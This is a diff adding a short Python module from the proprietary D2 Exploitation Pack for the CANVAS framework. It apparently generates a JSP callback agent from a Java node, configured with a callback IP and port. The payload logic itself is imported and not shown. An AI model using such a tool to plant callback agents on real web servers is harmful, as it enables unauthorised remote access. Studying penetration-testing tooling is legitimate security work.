@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD Modules
+###
+import sys
+import os
+
+if '.' not in sys.path:
+    sys.path.append('.')
+    sys.path.append('3rdparty/D2SEC/libs')
+
+###
+# Canvas modules
+###
+from d2_exploitutils import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+
+NAME             = 'd2sec_javatojsp'
+DESCRIPTION      = 'Convert javaNode.java to a .jsp file'
+DOCUMENTATION    = {}
+
+VERSION          = '1.0'
+PROPERTY         = {}
+PROPERTY['TYPE'] = 'Tools'
+PROPERTY['SITE'] = 'Local'
+PROPERTY['ARCH'] = [['All']]
+
+CHANGELOG = """
+"""
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.dstfile = ''
+    self.cback_ip = '8.8.8.8'
+    self.cback_port = 5555
+
+  def getargs(self):
+    self.dstfile = self.argsDict.get("dstfile",self.dstfile)
+    self.cback_ip = self.argsDict.get("cback_ip",self.cback_ip)
+    self.cback_port = int(self.argsDict.get("cback_port", self.cback_port))
+
+  def run(self):
+    self.setInfo("%s (in progress)" % NAME)
+    self.getargs()
+    d2_javatojsp(self, self.cback_ip, self.cback_port, self.dstfile)
+    self.setInfo("%s - done (success)" % NAME)
+    return 1
+
+if __name__ == '__main__':
+    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
+    app = theexploit()
+    ret = standard_callback_commandline(app)
